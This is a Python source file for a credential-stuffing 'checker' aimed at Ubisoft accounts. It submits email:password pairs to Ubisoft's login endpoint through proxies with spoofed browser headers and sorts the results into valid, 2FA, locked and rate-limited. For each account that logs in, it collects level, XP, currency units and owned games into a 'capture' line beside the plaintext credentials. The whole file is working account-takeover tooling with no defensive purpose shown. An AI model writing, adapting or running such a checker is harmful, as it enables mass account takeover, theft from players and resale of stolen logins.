import requests, base64, re

class Ubisoft:
    def __init__(self):
        self.session = requests.Session()

        self.hits = 0
        self.bad = 0
        self.tfa = 0
        self.retry = 0
        self.locked = 0
        self.custom = 0

    def base(self, email: str, password: str):
        return base64.b64encode(f"{email}:{password}".encode()).decode()
    
    def auth(self, email: str, password: str, proxy: dict = None):
        bae = self.base(email, password)

        try:
            r = self.session.post("https://public-ubiservices.ubi.com/v3/profiles/sessions",
                headers={
                    "accept": "application/json",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "authorization": f"Basic {bae}",
                    "content-length": "19",
                    "content-type": "application/json",
                    "genomeid": "42d07c95-9914-4450-8b38-267c4e462b21",
                    "origin": "https://connect.ubisoft.com",
                    "priority": "u=1, i",
                    "referer": "https://connect.ubisoft.com/",
                    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "cross-site",
                    "ubi-appid": "82b650c0-6cb3-40c0-9f41-25a53b62b206",
                    "ubi-requestedplatformtype": "uplay",
                    "ubi-transactionid": "51ffc1a6-bfa8-42b6-8319-4bcc5f5616a1",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
                }, json={"rememberMe": True}, proxies=proxy)
            
            tk = r.json().get("ticket")
            username = r.json().get("nameOnPlatform")
            pid = r.json().get("profileId")
            sid = r.json().get("sessionId")

            capture = None

            if "Email format is invalid." in r.text or "Invalid credentials" in r.text or "Password is required" in r.text:
                return "bad", None
            elif "Ubi-Challenge header is required for action 'BasicAuthentication" in r.text or "Too many calls per IP address" in r.text:
                return "retry", None
            elif "userId"in r.text:
                capture = self.capture(email, password, tk, username, pid, sid, proxy)
                return "ok", capture
            elif "\"rememberMeTicket\":null," in r.text:
                return "2fa", None
            elif "Authentication forbidden because of suspicious activity" in r.text:
                return "locked", None
            else:
                return "custom", None
            
        except Exception as e:
            print(e)
            return "retry", None
        
    def profile(self, tk: str, proxy: dict = None):
        try:
            r = self.session.get("https://public-ubiservices.ubi.com/v1/profiles/me/global/ubiconnect/economy/api/metaprogression",
                headers={
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US,en;q=0.9",
                    "authorization": f"Ubi_v1 t={tk}",
                    "cache-control": "max-age=0",
                    "origin": "https://connect.ubisoft.com",
                    "referer": "https://connect.ubisoft.com/",
                    "sec-ch-ua": '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "cross-site",
                    "ubi-appid": "314d4fef-e568-454a-ae06-43e3bece12a6",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
                }, proxies=proxy)
            
            level = r.json().get("level")
            xp = r.json().get("xp")

            return (level, xp)
            
        except Exception as e:
            print(e)
            return None, None
        
    def units(self, pid: str, tk: str, proxy: dict = None):
        try:
            r = self.session.get(f"https://public-ubiservices.ubi.com/v1/profiles/{pid}/global/ubiconnect/economy/api/units",
                headers={
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US,en;q=0.9",
                    "authorization": f"Ubi_v1 t={tk}",
                    "cache-control": "max-age=0",
                    "origin": "https://connect.ubisoft.com",
                    "referer": "https://connect.ubisoft.com/",
                    "sec-ch-ua": '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "cross-site",
                    "ubi-appid": "314d4fef-e568-454a-ae06-43e3bece12a6",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
                }, proxies=proxy)
            
            units = r.json().get("units")

            return units

        except Exception as e:
            print(e)
            return None
        
    def games(self, tk: str, sid: str, proxy: dict = None):
        try:
            r = self.session.get(f"https://public-ubiservices.ubi.com/v1/profiles/me/gamesplayed",
                headers={
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US,en;q=0.9",
                    "authorization": f"Ubi_v1 t={tk}",
                    "cache-control": "max-age=0",
                    "origin": "https://connect.ubisoft.com",
                    "referer": "https://connect.ubisoft.com/",
                    "sec-ch-ua": '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "cross-site",
                    "ubi-appid": "314d4fef-e568-454a-ae06-43e3bece12a6",
                    "ubi-sessionid": sid,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
                }, proxies=proxy)

            games = r.json()["gamesPlayed"]
            appids = []
            for game in games:
                for app in game["applications"]:
                    appids.append(app["applicationId"])

            try:
                r = self.session.get(f"https://public-ubiservices.ubi.com/v1/applications?applicationIds={','.join(appids)}&offset=0&limit=50",
                    headers={
                        "accept": "*/*",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US,en;q=0.9",
                        "authorization": f"Ubi_v1 t={tk}",
                        "cache-control": "max-age=0",
                        "origin": "https://connect.ubisoft.com",
                        "referer": "https://connect.ubisoft.com/",
                        "sec-ch-ua": '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": '"Windows"',
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site",
                        "ubi-appid": "314d4fef-e568-454a-ae06-43e3bece12a6",
                        "ubi-sessionid": sid,
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
                    }, proxies=proxy)

                stuff = re.findall(r'"name":"([^"]+)"', r.text)

                return stuff

            except Exception as e:
                print(e)
                return None

        except Exception as e:
            print(e)
            return None
        
    def capture(self, email: str, password: str, tk: str, username: str, pid: str, sid: str, proxy: dict = None):
        capture = f"{email}:{password} | USERNAME: {username} | "

        profile = self.profile(tk, proxy)
        if profile and any(profile):
            capture += f"LEVEL: {profile[0]} | XP: {profile[1]} | "

        units = self.units(pid, tk, proxy)
        if units:
            capture += f"UNITS: {units} | "

        games = self.games(tk, sid, proxy)
        if games and any(games):
            capture += f"GAMES: {games}"

        return capture